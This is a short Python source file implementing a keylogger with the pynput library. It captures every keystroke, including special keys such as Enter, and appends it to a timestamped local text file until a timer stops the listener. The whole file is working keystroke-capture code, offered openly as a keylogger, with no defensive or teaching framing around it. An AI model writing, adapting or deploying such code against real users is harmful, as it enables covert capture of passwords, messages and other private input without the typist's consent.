from pynput import keyboard
from threading import Timer
import datetime
import sys


def get_char(key):
    try:
        return key.char
    except AttributeError:
        return str(key)

def on_press(key):
    if str(key) == "Key.enter":
        key = "[ENTER]\n"
    with open(filename, 'a') as logs:
        logs.write(get_char(key))

def stop_logging():
    print("Exiting keylogger...")
    listener.stop()
    listener.join()
    sys.exit(0)



def start_keylogger(length):
    now = datetime.datetime.now()
    timestamp = now.strftime("%Y-%m-%d_%H-%M-%S")
    global filename
    filename = f"keylogs_{timestamp}.txt"
    global listener
    listener = keyboard.Listener(
        on_press=on_press,
    )
    timer = Timer(length, stop_logging)
    timer.start()
    listener.start()





